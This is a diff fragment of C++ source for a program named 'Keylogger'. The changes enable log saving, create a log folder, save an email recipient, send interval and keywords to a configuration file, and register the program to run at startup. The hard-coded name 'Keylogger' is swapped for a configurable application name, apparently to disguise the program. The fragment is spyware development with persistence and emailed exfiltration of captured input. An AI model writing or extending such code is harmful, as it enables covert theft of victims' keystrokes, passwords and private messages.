@@ -10,7 +10,7 @@
 #include <iostream>
 
 
-const bool saving_enabled = false;
+const bool saving_enabled = true;
 
 int main(int argc, char *argv[])
 {	
@@ -44,15 +44,16 @@ int main(int argc, char *argv[])
 
 			keywords = get_keywords();
 
+			// Create new directory
+			std::wstring new_directory(configuration::logs_base_path.begin(), configuration::logs_base_path.end());
+			utility::create_folder(new_directory.c_str());
+			
 			// Save it to the file
 			configuration::save_configuration_to_file(mail_to, email_send_loop_time, keywords);
 
 			utility::RegisterProgram();
-			utility::IsMyProgramRegisteredForStartup(L"Keylogger");
+			utility::IsMyProgramRegisteredForStartup(configuration::application_name.c_str());
 		}
-
-		//std::getchar();
-		//return 0;
 
 		/*************************************************/
 
